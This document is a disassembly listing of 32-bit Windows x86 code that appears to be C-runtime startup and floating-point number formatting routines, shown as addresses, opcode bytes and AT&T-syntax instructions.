  411b58:	e8 51 09 00 00       	call   0x4124ae
  411b5d:	68 ff 00 00 00       	push   $0xff
  411b62:	e8 8d 07 00 00       	call   0x4122f4
  411b67:	59                   	pop    %ecx
  411b68:	59                   	pop    %ecx
  411b69:	c3                   	ret
  411b6a:	6a 60                	push   $0x60
  411b6c:	68 80 81 41 00       	push   $0x418180
  411b71:	e8 9e 14 00 00       	call   0x413014
  411b76:	bf 94 00 00 00       	mov    $0x94,%edi
  411b7b:	8b c7                	mov    %edi,%eax
  411b7d:	e8 de 14 00 00       	call   0x413060
  411b82:	89 65 e8             	mov    %esp,-0x18(%ebp)
  411b85:	8b f4                	mov    %esp,%esi
  411b87:	89 3e                	mov    %edi,(%esi)
  411b89:	56                   	push   %esi
  411b8a:	ff 15 84 80 41 00    	call   *0x418084
  411b90:	8b 4e 10             	mov    0x10(%esi),%ecx
  411b93:	89 0d 8c 6c 45 00    	mov    %ecx,0x456c8c
  411b99:	8b 46 04             	mov    0x4(%esi),%eax
  411b9c:	a3 98 6c 45 00       	mov    %eax,0x456c98
  411ba1:	8b 56 08             	mov    0x8(%esi),%edx
  411ba4:	89 15 9c 6c 45 00    	mov    %edx,0x456c9c
  411baa:	8b 76 0c             	mov    0xc(%esi),%esi
  411bad:	81 e6 ff 7f 00 00    	and    $0x7fff,%esi
  411bb3:	89 35 90 6c 45 00    	mov    %esi,0x456c90
  411bb9:	83 f9 02             	cmp    $0x2,%ecx
  411bbc:	74 0c                	je     0x411bca
  411bbe:	81 ce 00 80 00 00    	or     $0x8000,%esi
  411bc4:	89 35 90 6c 45 00    	mov    %esi,0x456c90
  411bca:	c1 e0 08             	shl    $0x8,%eax
  411bcd:	03 c2                	add    %edx,%eax
  411bcf:	a3 94 6c 45 00       	mov    %eax,0x456c94
  411bd4:	33 f6                	xor    %esi,%esi
  411bd6:	56                   	push   %esi
  411bd7:	8b 3d 10 80 41 00    	mov    0x418010,%edi
  411bdd:	ff d7                	call   *%edi
  411bdf:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%eax)
  411be4:	75 1f                	jne    0x411c05
  411be6:	8b 48 3c             	mov    0x3c(%eax),%ecx
  411be9:	03 c8                	add    %eax,%ecx
  411beb:	81 39 50 45 00 00    	cmpl   $0x4550,(%ecx)
  411bf1:	75 12                	jne    0x411c05
  411bf3:	0f b7 41 18          	movzwl 0x18(%ecx),%eax
  411bf7:	3d 0b 01 00 00       	cmp    $0x10b,%eax
  411bfc:	74 1f                	je     0x411c1d
  411bfe:	3d 0b 02 00 00       	cmp    $0x20b,%eax
  411c03:	74 05                	je     0x411c0a
  411c05:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  411c08:	eb 27                	jmp    0x411c31
  411c0a:	83 b9 84 00 00 00 0e 	cmpl   $0xe,0x84(%ecx)
  411c11:	76 f2                	jbe    0x411c05
  411c13:	33 c0                	xor    %eax,%eax
  411c15:	39 b1 f8 00 00 00    	cmp    %esi,0xf8(%ecx)
  411c1b:	eb 0e                	jmp    0x411c2b
  411c1d:	83 79 74 0e          	cmpl   $0xe,0x74(%ecx)
  411c21:	76 e2                	jbe    0x411c05
  411c23:	33 c0                	xor    %eax,%eax
  411c25:	39 b1 e8 00 00 00    	cmp    %esi,0xe8(%ecx)
  411c2b:	0f 95 c0             	setne  %al
  411c2e:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  411c31:	6a 01                	push   $0x1
  411c33:	e8 88 13 00 00       	call   0x412fc0
  411c38:	59                   	pop    %ecx
  411c39:	85 c0                	test   %eax,%eax
  411c3b:	75 08                	jne    0x411c45
  411c3d:	6a 1c                	push   $0x1c
  411c3f:	e8 02 ff ff ff       	call   0x411b46
  411c44:	59                   	pop    %ecx
  411c45:	e8 ed 12 00 00       	call   0x412f37
  411c4a:	85 c0                	test   %eax,%eax
  411c4c:	75 08                	jne    0x411c56
  411c4e:	6a 10                	push   $0x10
  411c50:	e8 f1 fe ff ff       	call   0x411b46
  411c55:	59                   	pop    %ecx
  411c56:	e8 c5 11 00 00       	call   0x412e20
  411c5b:	89 75 fc             	mov    %esi,-0x4(%ebp)
  411c5e:	e8 bf 0f 00 00       	call   0x412c22
  411c63:	85 c0                	test   %eax,%eax
  411c65:	7d 08                	jge    0x411c6f
  411c67:	6a 1b                	push   $0x1b
  411c69:	e8 b3 fe ff ff       	call   0x411b21
  411c6e:	59                   	pop    %ecx
  411c6f:	ff 15 80 80 41 00    	call   *0x418080
  411c75:	a3 70 74 45 00       	mov    %eax,0x457470
  411c7a:	e8 81 0e 00 00       	call   0x412b00
  411c7f:	a3 7c 6c 45 00       	mov    %eax,0x456c7c
  411c84:	e8 d5 0d 00 00       	call   0x412a5e
  411c89:	85 c0                	test   %eax,%eax
  411c8b:	7d 08                	jge    0x411c95
  411c8d:	6a 08                	push   $0x8
  411c8f:	e8 8d fe ff ff       	call   0x411b21
  411c94:	59                   	pop    %ecx
  411c95:	e8 91 0b 00 00       	call   0x41282b
  411c9a:	85 c0                	test   %eax,%eax
  411c9c:	7d 08                	jge    0x411ca6
  411c9e:	6a 09                	push   $0x9
  411ca0:	e8 7c fe ff ff       	call   0x411b21
  411ca5:	59                   	pop    %ecx
  411ca6:	e8 8b 06 00 00       	call   0x412336
  411cab:	89 45 e0             	mov    %eax,-0x20(%ebp)
  411cae:	3b c6                	cmp    %esi,%eax
  411cb0:	74 07                	je     0x411cb9
  411cb2:	50                   	push   %eax
  411cb3:	e8 69 fe ff ff       	call   0x411b21
  411cb8:	59                   	pop    %ecx
  411cb9:	89 75 c8             	mov    %esi,-0x38(%ebp)
  411cbc:	8d 45 9c             	lea    -0x64(%ebp),%eax
  411cbf:	50                   	push   %eax
  411cc0:	ff 15 7c 80 41 00    	call   *0x41807c
  411cc6:	e8 f7 0a 00 00       	call   0x4127c2
  411ccb:	89 45 98             	mov    %eax,-0x68(%ebp)
  411cce:	f6 45 c8 01          	testb  $0x1,-0x38(%ebp)
  411cd2:	74 06                	je     0x411cda
  411cd4:	0f b7 45 cc          	movzwl -0x34(%ebp),%eax
  411cd8:	eb 03                	jmp    0x411cdd
  411cda:	6a 0a                	push   $0xa
  411cdc:	58                   	pop    %eax
  411cdd:	50                   	push   %eax
  411cde:	ff 75 98             	push   -0x68(%ebp)
  411ce1:	56                   	push   %esi
  411ce2:	56                   	push   %esi
  411ce3:	ff d7                	call   *%edi
  411ce5:	50                   	push   %eax
  411ce6:	e8 5a f8 ff ff       	call   0x411545
  411ceb:	8b f8                	mov    %eax,%edi
  411ced:	89 7d 94             	mov    %edi,-0x6c(%ebp)
  411cf0:	39 75 e4             	cmp    %esi,-0x1c(%ebp)
  411cf3:	75 06                	jne    0x411cfb
  411cf5:	57                   	push   %edi
  411cf6:	e8 73 07 00 00       	call   0x41246e
  411cfb:	e8 90 07 00 00       	call   0x412490
  411d00:	eb 2b                	jmp    0x411d2d
  411d02:	8b 45 ec             	mov    -0x14(%ebp),%eax
  411d05:	8b 08                	mov    (%eax),%ecx
  411d07:	8b 09                	mov    (%ecx),%ecx
  411d09:	89 4d 90             	mov    %ecx,-0x70(%ebp)
  411d0c:	50                   	push   %eax
  411d0d:	51                   	push   %ecx
  411d0e:	e8 4b 09 00 00       	call   0x41265e
  411d13:	59                   	pop    %ecx
  411d14:	59                   	pop    %ecx
  411d15:	c3                   	ret
  411d16:	8b 65 e8             	mov    -0x18(%ebp),%esp
  411d19:	8b 7d 90             	mov    -0x70(%ebp),%edi
  411d1c:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  411d20:	75 06                	jne    0x411d28
  411d22:	57                   	push   %edi
  411d23:	e8 57 07 00 00       	call   0x41247f
  411d28:	e8 72 07 00 00       	call   0x41249f
  411d2d:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  411d31:	8b c7                	mov    %edi,%eax
  411d33:	8d 65 84             	lea    -0x7c(%ebp),%esp
  411d36:	e8 14 13 00 00       	call   0x41304f
  411d3b:	c3                   	ret
  411d3c:	56                   	push   %esi
  411d3d:	8b 74 24 08          	mov    0x8(%esp),%esi
  411d41:	0f be 06             	movsbl (%esi),%eax
  411d44:	50                   	push   %eax
  411d45:	e8 55 14 00 00       	call   0x41319f
  411d4a:	83 f8 65             	cmp    $0x65,%eax
  411d4d:	eb 0c                	jmp    0x411d5b
  411d4f:	46                   	inc    %esi
  411d50:	0f be 06             	movsbl (%esi),%eax
  411d53:	50                   	push   %eax
  411d54:	e8 44 13 00 00       	call   0x41309d
  411d59:	85 c0                	test   %eax,%eax
  411d5b:	59                   	pop    %ecx
  411d5c:	75 f1                	jne    0x411d4f
  411d5e:	8a 06                	mov    (%esi),%al
  411d60:	8a 0d d4 61 45 00    	mov    0x4561d4,%cl
  411d66:	88 0e                	mov    %cl,(%esi)
  411d68:	46                   	inc    %esi
  411d69:	8a 0e                	mov    (%esi),%cl
  411d6b:	88 06                	mov    %al,(%esi)
  411d6d:	8a c1                	mov    %cl,%al
  411d6f:	8a 0e                	mov    (%esi),%cl
  411d71:	46                   	inc    %esi
  411d72:	84 c9                	test   %cl,%cl
  411d74:	75 f3                	jne    0x411d69
  411d76:	5e                   	pop    %esi
  411d77:	c3                   	ret
  411d78:	8b 44 24 04          	mov    0x4(%esp),%eax
  411d7c:	53                   	push   %ebx
  411d7d:	8a 1d d4 61 45 00    	mov    0x4561d4,%bl
  411d83:	eb 05                	jmp    0x411d8a
  411d85:	3a cb                	cmp    %bl,%cl
  411d87:	74 07                	je     0x411d90
  411d89:	40                   	inc    %eax
  411d8a:	8a 08                	mov    (%eax),%cl
  411d8c:	84 c9                	test   %cl,%cl
  411d8e:	75 f5                	jne    0x411d85
  411d90:	8a 08                	mov    (%eax),%cl
  411d92:	40                   	inc    %eax
  411d93:	84 c9                	test   %cl,%cl
  411d95:	74 2a                	je     0x411dc1
  411d97:	eb 0b                	jmp    0x411da4
  411d99:	80 f9 65             	cmp    $0x65,%cl
  411d9c:	74 0c                	je     0x411daa
  411d9e:	80 f9 45             	cmp    $0x45,%cl
  411da1:	74 07                	je     0x411daa
  411da3:	40                   	inc    %eax
  411da4:	8a 08                	mov    (%eax),%cl
  411da6:	84 c9                	test   %cl,%cl
  411da8:	75 ef                	jne    0x411d99
  411daa:	8b d0                	mov    %eax,%edx
  411dac:	48                   	dec    %eax
  411dad:	80 38 30             	cmpb   $0x30,(%eax)
  411db0:	74 fa                	je     0x411dac
  411db2:	38 18                	cmp    %bl,(%eax)
  411db4:	75 01                	jne    0x411db7
  411db6:	48                   	dec    %eax
  411db7:	8a 0a                	mov    (%edx),%cl
  411db9:	40                   	inc    %eax
  411dba:	42                   	inc    %edx
  411dbb:	84 c9                	test   %cl,%cl
  411dbd:	88 08                	mov    %cl,(%eax)
  411dbf:	75 f6                	jne    0x411db7
  411dc1:	5b                   	pop    %ebx
  411dc2:	c3                   	ret
  411dc3:	8b 44 24 04          	mov    0x4(%esp),%eax
  411dc7:	dd 00                	fldl   (%eax)
  411dc9:	dc 1d 90 81 41 00    	fcompl 0x418190
  411dcf:	df e0                	fnstsw %ax
  411dd1:	f6 c4 01             	test   $0x1,%ah
  411dd4:	75 04                	jne    0x411dda
  411dd6:	33 c0                	xor    %eax,%eax
  411dd8:	40                   	inc    %eax
  411dd9:	c3                   	ret
  411dda:	33 c0                	xor    %eax,%eax
  411ddc:	c3                   	ret
  411ddd:	55                   	push   %ebp
  411dde:	8b ec                	mov    %esp,%ebp
  411de0:	51                   	push   %ecx
  411de1:	51                   	push   %ecx
  411de2:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  411de6:	ff 75 10             	push   0x10(%ebp)
  411de9:	74 1b                	je     0x411e06
  411deb:	8d 45 f8             	lea    -0x8(%ebp),%eax
  411dee:	50                   	push   %eax
  411def:	e8 f1 16 00 00       	call   0x4134e5
  411df4:	8b 45 0c             	mov    0xc(%ebp),%eax
  411df7:	59                   	pop    %ecx
  411df8:	59                   	pop    %ecx
  411df9:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  411dfc:	89 08                	mov    %ecx,(%eax)
  411dfe:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  411e01:	89 48 04             	mov    %ecx,0x4(%eax)
  411e04:	c9                   	leave
  411e05:	c3                   	ret
  411e06:	8d 45 08             	lea    0x8(%ebp),%eax
  411e09:	50                   	push   %eax
  411e0a:	e8 19 17 00 00       	call   0x413528
  411e0f:	8b 45 0c             	mov    0xc(%ebp),%eax
  411e12:	59                   	pop    %ecx
  411e13:	59                   	pop    %ecx
  411e14:	8b 4d 08             	mov    0x8(%ebp),%ecx
  411e17:	89 08                	mov    %ecx,(%eax)
  411e19:	c9                   	leave
  411e1a:	c3                   	ret
  411e1b:	85 ff                	test   %edi,%edi
  411e1d:	56                   	push   %esi
  411e1e:	8b f0                	mov    %eax,%esi
  411e20:	74 14                	je     0x411e36
  411e22:	56                   	push   %esi
  411e23:	e8 88 1a 00 00       	call   0x4138b0
  411e28:	40                   	inc    %eax
  411e29:	50                   	push   %eax
  411e2a:	56                   	push   %esi
  411e2b:	03 f7                	add    %edi,%esi
  411e2d:	56                   	push   %esi
  411e2e:	e8 3d 17 00 00       	call   0x413570
  411e33:	83 c4 10             	add    $0x10,%esp
  411e36:	5e                   	pop    %esi
  411e37:	c3                   	ret
  411e38:	55                   	push   %ebp
  411e39:	8b ec                	mov    %esp,%ebp
  411e3b:	80 7d 10 00          	cmpb   $0x0,0x10(%ebp)
  411e3f:	56                   	push   %esi
  411e40:	8b f0                	mov    %eax,%esi
  411e42:	74 1d                	je     0x411e61
  411e44:	33 c0                	xor    %eax,%eax
  411e46:	39 45 08             	cmp    %eax,0x8(%ebp)
  411e49:	57                   	push   %edi
  411e4a:	0f 9f c0             	setg   %al
  411e4d:	33 c9                	xor    %ecx,%ecx
  411e4f:	83 3e 2d             	cmpl   $0x2d,(%esi)
  411e52:	0f 94 c1             	sete   %cl
  411e55:	8b f8                	mov    %eax,%edi
  411e57:	03 cb                	add    %ebx,%ecx
  411e59:	8b c1                	mov    %ecx,%eax
  411e5b:	e8 bb ff ff ff       	call   0x411e1b
  411e60:	5f                   	pop    %edi
  411e61:	83 3e 2d             	cmpl   $0x2d,(%esi)
  411e64:	8b c3                	mov    %ebx,%eax
  411e66:	75 06                	jne    0x411e6e
  411e68:	c6 03 2d             	movb   $0x2d,(%ebx)
  411e6b:	8d 43 01             	lea    0x1(%ebx),%eax
  411e6e:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  411e72:	7e 11                	jle    0x411e85
  411e74:	8d 48 01             	lea    0x1(%eax),%ecx
  411e77:	8a 11                	mov    (%ecx),%dl
  411e79:	88 10                	mov    %dl,(%eax)
  411e7b:	8b c1                	mov    %ecx,%eax
  411e7d:	8a 0d d4 61 45 00    	mov    0x4561d4,%cl
  411e83:	88 08                	mov    %cl,(%eax)
  411e85:	33 c9                	xor    %ecx,%ecx
  411e87:	38 4d 10             	cmp    %cl,0x10(%ebp)
  411e8a:	68 98 81 41 00       	push   $0x418198
  411e8f:	0f 94 c1             	sete   %cl
  411e92:	03 c8                	add    %eax,%ecx
  411e94:	03 4d 08             	add    0x8(%ebp),%ecx
  411e97:	51                   	push   %ecx
  411e98:	e8 a3 1a 00 00       	call   0x413940
  411e9d:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  411ea1:	59                   	pop    %ecx
  411ea2:	59                   	pop    %ecx
  411ea3:	8b c8                	mov    %eax,%ecx
  411ea5:	74 03                	je     0x411eaa
  411ea7:	c6 01 45             	movb   $0x45,(%ecx)
  411eaa:	8b 46 0c             	mov    0xc(%esi),%eax
  411ead:	41                   	inc    %ecx
  411eae:	80 38 30             	cmpb   $0x30,(%eax)
  411eb1:	74 2e                	je     0x411ee1
  411eb3:	8b 46 04             	mov    0x4(%esi),%eax
  411eb6:	48                   	dec    %eax
  411eb7:	79 05                	jns    0x411ebe
  411eb9:	f7 d8                	neg    %eax
  411ebb:	c6 01 2d             	movb   $0x2d,(%ecx)
  411ebe:	41                   	inc    %ecx
  411ebf:	83 f8 64             	cmp    $0x64,%eax
  411ec2:	7c 0a                	jl     0x411ece
  411ec4:	99                   	cltd
  411ec5:	6a 64                	push   $0x64
  411ec7:	5e                   	pop    %esi
  411ec8:	f7 fe                	idiv   %esi
  411eca:	00 01                	add    %al,(%ecx)
  411ecc:	8b c2                	mov    %edx,%eax
  411ece:	41                   	inc    %ecx
  411ecf:	83 f8 0a             	cmp    $0xa,%eax
  411ed2:	7c 0a                	jl     0x411ede
  411ed4:	99                   	cltd
  411ed5:	6a 0a                	push   $0xa
  411ed7:	5e                   	pop    %esi
  411ed8:	f7 fe                	idiv   %esi
  411eda:	00 01                	add    %al,(%ecx)
  411edc:	8b c2                	mov    %edx,%eax
  411ede:	00 41 01             	add    %al,0x1(%ecx)
  411ee1:	8b c3                	mov    %ebx,%eax
  411ee3:	5e                   	pop    %esi
  411ee4:	5d                   	pop    %ebp
  411ee5:	c3                   	ret
  411ee6:	55                   	push   %ebp
  411ee7:	8b ec                	mov    %esp,%ebp
  411ee9:	83 ec 2c             	sub    $0x2c,%esp
  411eec:	a1 10 62 45 00       	mov    0x456210,%eax
  411ef1:	33 45 04             	xor    0x4(%ebp),%eax
  411ef4:	53                   	push   %ebx
  411ef5:	89 45 fc             	mov    %eax,-0x4(%ebp)
  411ef8:	56                   	push   %esi
  411ef9:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  411efc:	50                   	push   %eax
  411efd:	8d 45 ec             	lea    -0x14(%ebp),%eax
  411f00:	50                   	push   %eax
  411f01:	8b 45 08             	mov    0x8(%ebp),%eax
  411f04:	ff 70 04             	push   0x4(%eax)
  411f07:	ff 30                	push   (%eax)
  411f09:	e8 5b 1c 00 00       	call   0x413b69
  411f0e:	8b 75 10             	mov    0x10(%ebp),%esi
  411f11:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  411f14:	8d 45 ec             	lea    -0x14(%ebp),%eax
  411f17:	50                   	push   %eax
  411f18:	8d 46 01             	lea    0x1(%esi),%eax
  411f1b:	50                   	push   %eax
  411f1c:	33 c0                	xor    %eax,%eax
  411f1e:	83 7d ec 2d          	cmpl   $0x2d,-0x14(%ebp)
  411f22:	8b d3                	mov    %ebx,%edx
  411f24:	0f 94 c0             	sete   %al
  411f27:	33 c9                	xor    %ecx,%ecx
  411f29:	85 f6                	test   %esi,%esi
  411f2b:	0f 9f c1             	setg   %cl
  411f2e:	03 d0                	add    %eax,%edx
  411f30:	03 ca                	add    %edx,%ecx
  411f32:	51                   	push   %ecx
  411f33:	e8 00 1b 00 00       	call   0x413a38
  411f38:	6a 00                	push   $0x0
  411f3a:	ff 75 14             	push   0x14(%ebp)
  411f3d:	8d 45 ec             	lea    -0x14(%ebp),%eax
  411f40:	56                   	push   %esi
  411f41:	e8 f2 fe ff ff       	call   0x411e38
  411f46:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  411f49:	33 4d 04             	xor    0x4(%ebp),%ecx
  411f4c:	83 c4 28             	add    $0x28,%esp
  411f4f:	5e                   	pop    %esi
  411f50:	8b c3                	mov    %ebx,%eax
  411f52:	5b                   	pop    %ebx
  411f53:	e8 b4 1c 00 00       	call   0x413c0c
  411f58:	c9                   	leave
  411f59:	c3                   	ret
  411f5a:	55                   	push   %ebp
  411f5b:	8b ec                	mov    %esp,%ebp
  411f5d:	53                   	push   %ebx
  411f5e:	56                   	push   %esi
  411f5f:	8b f0                	mov    %eax,%esi
  411f61:	8b 46 04             	mov    0x4(%esi),%eax
  411f64:	48                   	dec    %eax
  411f65:	80 7d 10 00          	cmpb   $0x0,0x10(%ebp)
  411f69:	57                   	push   %edi
  411f6a:	74 1b                	je     0x411f87
  411f6c:	3b 45 0c             	cmp    0xc(%ebp),%eax
  411f6f:	75 16                	jne    0x411f87
  411f71:	33 c9                	xor    %ecx,%ecx
  411f73:	83 3e 2d             	cmpl   $0x2d,(%esi)
  411f76:	0f 94 c1             	sete   %cl
  411f79:	03 c8                	add    %eax,%ecx
  411f7b:	03 4d 08             	add    0x8(%ebp),%ecx
  411f7e:	8b c1                	mov    %ecx,%eax
  411f80:	c6 00 30             	movb   $0x30,(%eax)
  411f83:	80 60 01 00          	andb   $0x0,0x1(%eax)
  411f87:	83 3e 2d             	cmpl   $0x2d,(%esi)
  411f8a:	8b 5d 08             	mov    0x8(%ebp),%ebx
  411f8d:	75 04                	jne    0x411f93
  411f8f:	c6 03 2d             	movb   $0x2d,(%ebx)
  411f92:	43                   	inc    %ebx
  411f93:	8b 46 04             	mov    0x4(%esi),%eax
  411f96:	33 ff                	xor    %edi,%edi
  411f98:	47                   	inc    %edi
  411f99:	85 c0                	test   %eax,%eax
  411f9b:	7f 0d                	jg     0x411faa
  411f9d:	8b c3                	mov    %ebx,%eax
  411f9f:	e8 77 fe ff ff       	call   0x411e1b
  411fa4:	c6 03 30             	movb   $0x30,(%ebx)
  411fa7:	43                   	inc    %ebx
  411fa8:	eb 02                	jmp    0x411fac
  411faa:	03 d8                	add    %eax,%ebx
  411fac:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  411fb0:	7e 3c                	jle    0x411fee
  411fb2:	8b c3                	mov    %ebx,%eax
  411fb4:	e8 62 fe ff ff       	call   0x411e1b
  411fb9:	a0 d4 61 45 00       	mov    0x4561d4,%al
  411fbe:	88 03                	mov    %al,(%ebx)
  411fc0:	8b 76 04             	mov    0x4(%esi),%esi
  411fc3:	43                   	inc    %ebx
  411fc4:	85 f6                	test   %esi,%esi
  411fc6:	7d 26                	jge    0x411fee
  411fc8:	f7 de                	neg    %esi
  411fca:	80 7d 10 00          	cmpb   $0x0,0x10(%ebp)
  411fce:	75 05                	jne    0x411fd5
  411fd0:	39 75 0c             	cmp    %esi,0xc(%ebp)
  411fd3:	7c 03                	jl     0x411fd8
  411fd5:	89 75 0c             	mov    %esi,0xc(%ebp)
  411fd8:	8b 7d 0c             	mov    0xc(%ebp),%edi
  411fdb:	8b c3                	mov    %ebx,%eax
  411fdd:	e8 39 fe ff ff       	call   0x411e1b
  411fe2:	57                   	push   %edi
  411fe3:	6a 30                	push   $0x30
  411fe5:	53                   	push   %ebx
  411fe6:	e8 35 1c 00 00       	call   0x413c20
  411feb:	83 c4 0c             	add    $0xc,%esp
  411fee:	8b 45 08             	mov    0x8(%ebp),%eax
  411ff1:	5f                   	pop    %edi
  411ff2:	5e                   	pop    %esi
  411ff3:	5b                   	pop    %ebx
  411ff4:	5d                   	pop    %ebp
  411ff5:	c3                   	ret
  411ff6:	55                   	push   %ebp
  411ff7:	8b ec                	mov    %esp,%ebp
  411ff9:	83 ec 2c             	sub    $0x2c,%esp
  411ffc:	a1 10 62 45 00       	mov    0x456210,%eax
  412001:	33 45 04             	xor    0x4(%ebp),%eax
  412004:	56                   	push   %esi
  412005:	89 45 fc             	mov    %eax,-0x4(%ebp)
  412008:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  41200b:	50                   	push   %eax
  41200c:	8d 45 ec             	lea    -0x14(%ebp),%eax
  41200f:	50                   	push   %eax
  412010:	8b 45 08             	mov    0x8(%ebp),%eax
  412013:	ff 70 04             	push   0x4(%eax)
  412016:	ff 30                	push   (%eax)
  412018:	e8 4c 1b 00 00       	call   0x413b69
  41201d:	8b 75 10             	mov    0x10(%ebp),%esi
  412020:	8d 45 ec             	lea    -0x14(%ebp),%eax
  412023:	50                   	push   %eax
  412024:	8b 45 f0             	mov    -0x10(%ebp),%eax
  412027:	03 c6                	add    %esi,%eax
  412029:	50                   	push   %eax
  41202a:	33 c0                	xor    %eax,%eax
  41202c:	83 7d ec 2d          	cmpl   $0x2d,-0x14(%ebp)
  412030:	0f 94 c0             	sete   %al
  412033:	03 45 0c             	add    0xc(%ebp),%eax
  412036:	50                   	push   %eax
  412037:	e8 fc 19 00 00       	call   0x413a38
  41203c:	6a 00                	push   $0x0
  41203e:	56                   	push   %esi
  41203f:	ff 75 0c             	push   0xc(%ebp)
  412042:	8d 45 ec             	lea    -0x14(%ebp),%eax
  412045:	e8 10 ff ff ff       	call   0x411f5a
  41204a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  41204d:	33 4d 04             	xor    0x4(%ebp),%ecx
  412050:	8b 45 0c             	mov    0xc(%ebp),%eax
  412053:	83 c4 28             	add    $0x28,%esp
  412056:	5e                   	pop    %esi
  412057:	e8 b0 1b 00 00       	call   0x413c0c
  41205c:	c9                   	leave
  41205d:	c3                   	ret
  41205e:	55                   	push   %ebp
  41205f:	8b ec                	mov    %esp,%ebp
  412061:	83 ec 2c             	sub    $0x2c,%esp
  412064:	a1 10 62 45 00       	mov    0x456210,%eax
  412069:	33 45 04             	xor    0x4(%ebp),%eax
  41206c:	53                   	push   %ebx
  41206d:	56                   	push   %esi
  41206e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  412071:	57                   	push   %edi
  412072:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  412075:	50                   	push   %eax
  412076:	8d 45 ec             	lea    -0x14(%ebp),%eax
  412079:	50                   	push   %eax
  41207a:	8b 45 08             	mov    0x8(%ebp),%eax
  41207d:	ff 70 04             	push   0x4(%eax)
  412080:	ff 30                	push   (%eax)
  412082:	e8 e2 1a 00 00       	call   0x413b69
  412087:	8b 75 f0             	mov    -0x10(%ebp),%esi
  41208a:	8b 5d 10             	mov    0x10(%ebp),%ebx
  41208d:	33 c0                	xor    %eax,%eax
  41208f:	4e                   	dec    %esi
  412090:	83 7d ec 2d          	cmpl   $0x2d,-0x14(%ebp)
  412094:	0f 94 c0             	sete   %al
  412097:	03 45 0c             	add    0xc(%ebp),%eax
  41209a:	8b f8                	mov    %eax,%edi
  41209c:	8d 45 ec             	lea    -0x14(%ebp),%eax
  41209f:	50                   	push   %eax
  4120a0:	53                   	push   %ebx
  4120a1:	57                   	push   %edi
  4120a2:	e8 91 19 00 00       	call   0x413a38
  4120a7:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4120aa:	83 c4 1c             	add    $0x1c,%esp
  4120ad:	48                   	dec    %eax
  4120ae:	3b f0                	cmp    %eax,%esi
  4120b0:	0f 9c c1             	setl   %cl
  4120b3:	83 f8 fc             	cmp    $0xfffffffc,%eax
  4120b6:	7c 22                	jl     0x4120da
  4120b8:	3b c3                	cmp    %ebx,%eax
  4120ba:	7d 1e                	jge    0x4120da
  4120bc:	84 c9                	test   %cl,%cl
  4120be:	74 0a                	je     0x4120ca
  4120c0:	8a 07                	mov    (%edi),%al
  4120c2:	47                   	inc    %edi
  4120c3:	84 c0                	test   %al,%al
  4120c5:	75 f9                	jne    0x4120c0
  4120c7:	20 47 fe             	and    %al,-0x2(%edi)
  4120ca:	6a 01                	push   $0x1
  4120cc:	53                   	push   %ebx
  4120cd:	ff 75 0c             	push   0xc(%ebp)
  4120d0:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4120d3:	e8 82 fe ff ff       	call   0x411f5a
  4120d8:	eb 11                	jmp    0x4120eb
  4120da:	6a 01                	push   $0x1
  4120dc:	ff 75 14             	push   0x14(%ebp)
  4120df:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4120e2:	53                   	push   %ebx
  4120e3:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  4120e6:	e8 4d fd ff ff       	call   0x411e38
  4120eb:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4120ee:	33 4d 04             	xor    0x4(%ebp),%ecx
  4120f1:	83 c4 0c             	add    $0xc,%esp
  4120f4:	5f                   	pop    %edi
  4120f5:	5e                   	pop    %esi
  4120f6:	5b                   	pop    %ebx
  4120f7:	e8 10 1b 00 00       	call   0x413c0c
  4120fc:	c9                   	leave
  4120fd:	c3                   	ret
  4120fe:	55                   	push   %ebp
  4120ff:	8b ec                	mov    %esp,%ebp
  412101:	83 7d 10 65          	cmpl   $0x65,0x10(%ebp)
  412105:	74 32                	je     0x412139
  412107:	83 7d 10 45          	cmpl   $0x45,0x10(%ebp)
  41210b:	74 2c                	je     0x412139
  41210d:	83 7d 10 66          	cmpl   $0x66,0x10(%ebp)
  412111:	75 13                	jne    0x412126
  412113:	ff 75 14             	push   0x14(%ebp)
  412116:	ff 75 0c             	push   0xc(%ebp)
  412119:	ff 75 08             	push   0x8(%ebp)
  41211c:	e8 d5 fe ff ff       	call   0x411ff6
  412121:	83 c4 0c             	add    $0xc,%esp
  412124:	5d                   	pop    %ebp
  412125:	c3                   	ret
  412126:	ff 75 18             	push   0x18(%ebp)
  412129:	ff 75 14             	push   0x14(%ebp)
  41212c:	ff 75 0c             	push   0xc(%ebp)
  41212f:	ff 75 08             	push   0x8(%ebp)
  412132:	e8 27 ff ff ff       	call   0x41205e
  412137:	eb 11                	jmp    0x41214a
  412139:	ff 75 18             	push   0x18(%ebp)
  41213c:	ff 75 14             	push   0x14(%ebp)
  41213f:	ff 75 0c             	push   0xc(%ebp)
  412142:	ff 75 08             	push   0x8(%ebp)
  412145:	e8 9c fd ff ff       	call   0x411ee6
  41214a:	83 c4 10             	add    $0x10,%esp
  41214d:	5d                   	pop    %ebp
  41214e:	c3                   	ret
  41214f:	68 00 00 03 00       	push   $0x30000
  412154:	68 00 00 01 00       	push   $0x10000
  412159:	e8 7d 1c 00 00       	call   0x413ddb
  41215e:	59                   	pop    %ecx
  41215f:	59                   	pop    %ecx
  412160:	c3                   	ret
  412161:	55                   	push   %ebp
  412162:	8b ec                	mov    %esp,%ebp
  412164:	83 ec 18             	sub    $0x18,%esp
  412167:	dd 05 b0 81 41 00    	fldl   0x4181b0
  41216d:	dd 5d f8             	fstpl  -0x8(%ebp)
  412170:	dd 05 a8 81 41 00    	fldl   0x4181a8
  412176:	dd 5d f0             	fstpl  -0x10(%ebp)
